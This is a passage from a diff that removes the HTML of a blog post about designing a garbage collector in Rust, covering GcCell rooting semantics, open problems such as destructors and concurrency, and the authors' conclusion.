-inner data. This is one of the places where Rust&rsquo;s ownership/mutability system works out awesomely
-in our favor.</p>
-
-<p>Of course, an immutable GC isn&rsquo;t very useful. We can&rsquo;t even create cycles in an immutable GC, so why
-would anyone need this in the first place<sup id="fnref:2"><a href="#fn:2" rel="footnote">2</a></sup>?</p>
-
-<p>So of course, we needed to make it somehow mutable. People using <code>Rc&lt;T&gt;</code> solve this problem by using
-<code>RefCell&lt;T&gt;</code>, which maintains something similar to the borrow semantics at runtime and is internally
-mutable. <code>RefCell&lt;T&gt;</code> itself can&rsquo;t be used by us since it doesn&rsquo;t guard against the problem
-illustrated above (and hence won&rsquo;t implement <code>Trace</code>, but a similar cell type would work).</p>
-
-<p>So we created <code>GcCell&lt;T&gt;</code>. This behaves just like <code>RefCell&lt;T&gt;</code>, except that it will <code>root()</code> before
-beginning a mutable borrow, and <code>unroot()</code> before ending it (well, only if it itself is not rooted,
-which is tracked by an internal field similar to <code>Gc&lt;T&gt;</code>). Now, everything is safe:</p>
-
-<pre><code class="rust">#[derive(Trace)]
-struct Foo {
-    a: u8,
-    b: GcCell&lt;Gc&lt;u8&gt;&gt;,
-}
-
-let x = Gc::new(20);
-
-let y = Gc::new(Foo {a: 10, b: Gc::new(30)});
-{
-    *y.b.borrow_mut() = x; // the `Gc(30)` from `y.b` was rooted by this call
-                           // but since we don't actually use it here,
-                           // the destructor gets rid of it.
-                           // We could use swap() to retain access to it.
-    // ...
-    // x unrooted
-}
-
-
-// and the reverse case works too:
-
-let y = Gc::new(GcCell::new(Some(Gc::new(20))));
-
-let x = y.borrow_mut().take(); // the inner `Some(Gc(20))` gets rooted by `borrow_mut()`
-                               // before `x` can access it
-</code></pre>
-
-<p>So now, mutation works too! We have a working garbage collector!</p>
-
-<h1>Open problems</h1>
-
-<h2>Destructors</h2>
-
-<p>I believe this can be solved without lints, but it <em>may</em> require some upcoming features of Rust to
-be implemented first (like specialization).</p>
-
-<p>In essence, destructors implemented on a value inside <code>Gc&lt;T&gt;</code> can be unsafe. This will only happen
-if they try to access values within a <code>Gc&lt;T&gt;</code> &mdash; if they do, they may come across a box that
-has already been collected, or they may lengthen the lifetime of a box scheduled to be collected.</p>
-
-<p>The basic solution to this is to use &ldquo;finalizers&rdquo; instead of destructors. Finalizers, like in Java,
-are not guaranteed to run. However, we may need further drop hooks or trait specialization to make
-an airtight interface for this. I don&rsquo;t have a concrete design for this yet, though.</p>
-
-<h2>Concurrency</h2>
-
-<p>Our model mostly just works in a concurrent situation (with thread safety tweaks, of course); in
-fact it&rsquo;s possible to make it so that the concurrent GC will not &ldquo;stop the world&rdquo; unless someone
-tries to do a write to a <code>GcCell</code>. We have an experimental concurrent GC in <a href="https://github.com/Manishearth/rust-gc/pull/6">this pull
-request</a>. We still need to figure out how to make interop between both GCs safe, though we may
-just end up making them such that an object using one GC cannot be fed to an object using the other.</p>
-
-<h2>Performance</h2>
-
-<p>So far we haven&rsquo;t really focused on performance, and worked on ensuring safety. Our collection
-triggering algorithm, for example, was horribly inefficient, though we planned on improving it. The
-wonderful Huon <a href="https://github.com/Manishearth/rust-gc/pull/9">fixed this</a>, though.</p>
-
-<p>Similarly, we haven&rsquo;t yet optimized storage. We have some ideas which we may work on later. (If you
-want to help, contributions welcome!)</p>
-
-<h2>Cross-crate deriving</h2>
-
-<p>Currently, an object deriving <code>Trace</code> should have <code>Trace</code>able children. This isn&rsquo;t always possible
-when members from another crate (which does not depend on rust-gc) are involved. At the moment, we
-allow an <code>#[unsafe_ignore_trace]</code> annotation on fields which are of this type (which excludes it
-from being traced &ndash; if that crate doesn&rsquo;t transitively depend on rust-gc, its members cannot
-contain GCthings anyway unless generics are involved). It should be possible to detect whether or
-not this is safe, and/or autoderive <code>Trace</code> using the opt-in builtin traits framework (needs
-specialization to work), but at the moment we don&rsquo;t do anything other than expose that annotation.</p>
-
-<p>Stdlib support for a global <code>Trace</code> trait that everyone derives would be awesome.</p>
-
-<h1>Conclusion</h1>
-
-<p>Designing a GC was a wonderful experience! I didn&rsquo;t get to write much code (I was busy and Michael
-was able to implement most of it overnight because he&rsquo;s totally awesome), but the long design
-discussions followed by trying to figure out holes in the GC design in every idle moment of the day
-were quite enjoyable. GCs are very hard to get right, but it&rsquo;s very satisfying when you come up with
-a design that works! I&rsquo;m also quite happy at how well Rust helped in making a safe interface.</p>
-
-<p>I encourage everyone to try it out and/or find holes in our design. Contributions of all kind
-welcome, we&rsquo;d especially love performance improvements and testcases.</p>
-
-<p><small>Discuss: <a href="https://news.ycombinator.com/item?id=10148471">HN</a>, <a href="https://www.reddit.com/r/rust/comments/3j4bx2/designing_a_gc_in_rust/">Reddit</a></small></p>
-<div class="footnotes">
-<hr/>
-<ol>
-<li id="fn:1">
-<p>I&rsquo;m very skeptical that it&rsquo;s possible to make either of these completely sound without writing lints which effectively rewrite a large chunk of the compiler<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
-<li id="fn:2">
-<p>There is a case to be made for an immutable GC which allows some form of deferred initialization of GC fields, however.<a href="#fnref:2" rev="footnote">&#8617;</a></p></li>
 </ol>
 </div>
 
